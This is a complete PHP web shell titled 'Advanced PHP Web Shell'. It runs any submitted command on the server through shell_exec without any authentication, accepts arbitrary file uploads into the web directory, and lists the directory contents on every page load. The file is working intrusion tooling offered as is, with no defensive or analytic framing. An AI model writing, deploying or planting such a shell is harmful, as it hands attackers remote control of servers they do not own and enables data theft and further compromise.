<?php
if (isset($_POST['cmd'])) {
    $cmd = $_POST['cmd'];
    echo "<pre>" . shell_exec($cmd) . "</pre>";
} elseif (isset($_POST['upload'])) {
    if (isset($_FILES['file'])) {
        $target_path = getcwd() . "/" . basename($_FILES['file']['name']);
        if (move_uploaded_file($_FILES['file']['tmp_name'], $target_path)) {
            echo "<p>File uploaded successfully: " . $_FILES['file']['name'] . "</p>";
        } else {
            echo "<p>Error uploading file.</p>";
        }
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Advanced PHP Web Shell</title>
    <style>
        body {
            background-color: #1e1e1e;
            color: #ffffff;
            font-family: 'Courier New', Courier, monospace;
            margin: 0;
            padding: 20px;
        }
        h1 {
            color: #4caf50;
        }
        input[type="text"], input[type="file"] {
            width: 80%;
            padding: 10px;
            margin: 10px 0;
            background-color: #333;
            border: 1px solid #555;
            color: #fff;
        }
        input[type="submit"] {
            padding: 10px 20px;
            background-color: #4caf50;
            border: none;
            color: #fff;
            cursor: pointer;
        }
        input[type="submit"]:hover {
            background-color: #45a049;
        }
        pre {
            background-color: #333;
            padding: 10px;
            border: 1px solid #555;
            overflow-x: auto;
        }
        .container {
            max-width: 900px;
            margin: 0 auto;
            text-align: center;
        }
        .box {
            margin: 20px 0;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Advanced PHP Web Shell</h1>
        
        <!-- Command Execution Form -->
        <div class="box">
            <h2>Execute Command</h2>
            <form method="post">
                <input type="text" name="cmd" placeholder="Enter command here" autocomplete="off">
                <input type="submit" value="Execute">
            </form>
        </div>
        
        <!-- File Upload Form -->
        <div class="box">
            <h2>Upload File</h2>
            <form method="post" enctype="multipart/form-data">
                <input type="file" name="file">
                <input type="submit" name="upload" value="Upload">
            </form>
        </div>

        <!-- File System Browser -->
        <div class="box">
            <h2>File System Browser</h2>
            <pre><?php echo shell_exec('ls -lah'); ?></pre>
        </div>
    </div>
</body>
</html>
